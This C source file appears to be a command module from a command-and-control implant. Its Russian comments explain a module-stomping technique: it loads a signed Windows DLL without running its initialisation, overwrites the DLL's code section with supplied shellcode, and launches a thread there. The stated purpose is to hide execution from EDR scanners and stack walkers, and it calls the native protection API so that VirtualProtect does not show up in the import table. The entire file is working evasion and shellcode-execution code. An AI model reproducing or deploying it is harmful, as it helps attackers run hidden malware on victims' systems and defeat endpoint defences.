// Module stomping.
//
// Идея: загружаем "донорскую" подписанную DLL флагом
// DONT_RESOLVE_DLL_REFERENCES (выполнение DllMain не происходит, но
// PE-образ замаплен в память с легитимным MEM_IMAGE-бэкингом и именем).
// Затем перетираем её .text-секцию своим shellcode'ом и стартуем поток
// прямо внутри замапленного модуля. Стек-вокеры, EDR-сканы и
// VirtualQuery будут видеть исполнение в "ntdll.dll" / в подписанном
// модуле, а не в анонимной MEM_PRIVATE странице.
//
// Payload KV: dll (utf8, путь к донор-DLL), sc (bytes). Если dll пуст —
// используется "C:\\Windows\\System32\\xpsservices.dll" как умеренно
// крупный модуль с просторной .text-секцией.

#include "../core/beacon.h"

static void werr(const char* m) { out_write(m, rt_strlen(m)); }

static const uint8_t* kv_bytes(const BeaconTask* t, const char* key, uint32_t* out_len) {
    const uint8_t* p = NULL; uint32_t n = 0;
    if (!t || !t->pay) { *out_len = 0; return NULL; }
    if (!kv_find(t->pay, t->pay_len, key, &p, &n)) { *out_len = 0; return NULL; }
    *out_len = n;
    return p;
}

// Находит .text-секцию в PE и возвращает (base+rva, raw_size).
static int find_text_section(HMODULE mod, void** out_addr, uint32_t* out_size) {
    BYTE* base = (BYTE*)mod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        // ".text" — обычно первая исполняемая секция.
        const char* n = (const char*)sec[i].Name;
        if (n[0]=='.' && n[1]=='t' && n[2]=='e' && n[3]=='x' && n[4]=='t') {
            *out_addr = base + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                                 : sec[i].SizeOfRawData;
            return 1;
        }
    }
    return 0;
}

void cmd_modstomp(const BeaconTask* t) {
    uint32_t sc_len = 0;
    const uint8_t* sc = kv_bytes(t, "sc", &sc_len);
    if (!sc || !sc_len) { werr("usage: modstomp <sc>\n"); return; }

    char dll_a[260];
    uint32_t dl = 0;
    const uint8_t* dl_b = kv_bytes(t, "dll", &dl);
    if (dl_b && dl && dl < sizeof(dll_a)) {
        rt_memcpy(dll_a, dl_b, dl); dll_a[dl] = 0;
    } else {
        const char def[] = "C:\\Windows\\System32\\xpsservices.dll";
        for (size_t j = 0; j < sizeof(def); ++j) dll_a[j] = def[j];
    }

    wchar_t dll_w[260];
    if (MultiByteToWideChar(CP_UTF8, 0, dll_a, -1, dll_w, 260) <= 0) {
        werr("bad dll path\n"); return;
    }

    HMODULE mod = LoadLibraryExW(dll_w, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!mod) { werr("LoadLibraryEx failed\n"); return; }

    void* tbase = NULL; uint32_t tsize = 0;
    if (!find_text_section(mod, &tbase, &tsize)) {
        FreeLibrary(mod); werr(".text not found\n"); return;
    }
    if (sc_len > tsize) {
        FreeLibrary(mod); werr("shellcode larger than .text\n"); return;
    }

    // RWX → копируем shellcode → RX. Используем Nt-вариант, чтобы
    // не светить kernel32!VirtualProtect через IAT.
    PVOID pb = tbase; SIZE_T ps = sc_len; ULONG old = 0;
    if (NtProtectVirtualMemory_i(NtCurrentProcess(), &pb, &ps,
                                 PAGE_EXECUTE_READWRITE, &old) < 0) {
        FreeLibrary(mod); werr("VirtualProtect RWX failed\n"); return;
    }
    rt_memcpy(tbase, sc, sc_len);
    pb = tbase; ps = sc_len;
    NtProtectVirtualMemory_i(NtCurrentProcess(), &pb, &ps,
                             PAGE_EXECUTE_READ, &old);

    // Запускаем поток — start address указывает в .text легитимного модуля.
    HANDLE hth = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tbase,
                              NULL, 0, NULL);
    if (!hth) { werr("CreateThread failed\n"); return; }
    CloseHandle(hth);

    const char ok[] = "stomped module: ";
    out_write(ok, sizeof(ok) - 1);
    out_write(dll_a, rt_strlen(dll_a));
    out_write("\n", 1);
}
